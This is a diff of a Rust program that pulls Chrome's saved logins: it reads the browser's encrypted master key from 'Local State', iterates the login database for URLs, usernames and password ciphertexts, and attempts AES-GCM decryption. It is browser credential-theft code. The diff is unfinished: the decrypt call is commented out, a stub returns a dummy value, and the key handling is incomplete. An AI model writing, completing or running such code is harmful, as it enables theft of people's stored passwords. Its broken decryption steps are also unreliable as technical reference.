@@ -8,6 +8,9 @@ use aes_gcm::{
     aead::{Aead, AeadCore, KeyInit, OsRng},
     Aes256Gcm, Nonce, Key // Or `Aes128Gcm`
 };
+use aes_gcm::aead::consts::U12;
+use aes_gcm::aead::generic_array::GenericArray;
+use base64::{Engine as _, engine::general_purpose};
 
 // C:\Users\Admin\AppData\Local\Google\Chrome\User Data
 fn retrieve_secret_key() -> String {
@@ -23,7 +26,10 @@ fn retrieve_secret_key() -> String {
         let json_content: Value = serde_json::from_str(&*file_content)
             .expect("Unable to get JSON content");
 
-        return json_content["os_crypt"]["encrypted_key"].to_string();
+        let key = json_content["os_crypt"]["encrypted_key"].to_string();
+
+        // fix the base64 decoding
+        return String::from_utf8(general_purpose::PAD.decode(key).unwrap()).expect("Cannot decode key.");
     }
     println!("Unable to find the secret key.");
     exit(1);
@@ -32,9 +38,14 @@ fn retrieve_secret_key() -> String {
 fn decrypt_user_password(ciphertext : String, iv: String, secret_key: String) -> Vec<u8> {
     let key = Key::<Aes256Gcm>::from_slice(secret_key.as_bytes());
     let cipher = Aes256Gcm::new(&key);
-    let nonce =  Nonce::from_slice(iv.as_bytes());
+    let iv_vec: &[u8] = iv.as_bytes();
+    let nonce: &GenericArray<u8, U12> =  Nonce::from_slice(iv_vec);
 
-    return cipher.decrypt(&nonce, ciphertext.as_ref()).expect("Failed to decrypt.");
+    println!("{}", iv);
+    println!("{:?}", nonce);
+
+  //  return cipher.decrypt(&nonce, ciphertext.as_ref()).expect("Failed to decrypt.");
+    return vec![0];
 }
 
 fn get_user_db(secret_key : String) -> () {
@@ -47,13 +58,15 @@ fn get_user_db(secret_key : String) -> () {
         let mut statement = connection.prepare(query).unwrap();
 
         while let Ok(State::Row) = statement.next() {
-            println!("url: {}", statement.read::<String, _>(0).unwrap());
-            println!("Username: {}", statement.read::<String, _>(1).unwrap());
+            println!("url: {}", statement.read::<String, _>("action_url").unwrap());
+            println!("Username: {}", statement.read::<String, _>("username_value").unwrap());
 
-            let mut ciphertext = statement.read::<String, _>(2).unwrap();
+            let mut ciphertext = statement.read::<String, _>("password_value").unwrap();
             println!("Ciphertext: {}", ciphertext);
 
-            let iv =  ciphertext.substring(3, 20);
+
+            // Initialization vector stored between the third and fifteenth character (96-bits long)
+            let iv =  ciphertext.substring(3, 15);
 
             let plaintext: Vec<u8> = decrypt_user_password(ciphertext.clone(), iv.to_string(), secret_key.to_string());
 
